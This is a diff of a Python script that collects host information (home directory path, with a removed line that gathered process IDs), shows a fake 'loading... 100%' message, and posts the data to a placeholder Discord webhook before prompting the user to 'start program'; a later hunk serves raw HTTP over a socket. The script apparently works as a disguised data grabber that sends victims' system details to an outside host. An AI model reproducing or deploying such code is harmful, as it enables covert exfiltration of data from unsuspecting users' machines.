@@ -85,13 +85,9 @@ try:
 except:
 	print("system error. 07")
 try:
-	info.append(f"PROCESSES: || {psutil.pids()} ||")
-except:
-	print("system error. 08")
-try:
 	info.append(f"MAIN PATH: || {os.path.expanduser('~')} ||")
 except:
-	print("system error. 09")
+	print("system error. 08")
 info.append(f"-")
 print("loading... 100%")
 try:
@@ -99,7 +95,7 @@ try:
 	r = requests.post("your_discord_webhook_url", json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
 	print(r.text)
 except:
-	print("system error. 10")
+	print("system error. 09")
 print()
 input("[ Enter to start program ]")
 if os.name == "nt":
@@ -130,6 +126,6 @@ try:
 			print(f"{pack}")
 			c.send(f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}".encode())
 		except:
-			print("system error. 11")
+			print("system error. 10")
 except:
-	print("system error. 12")
+	print("system error. 11")
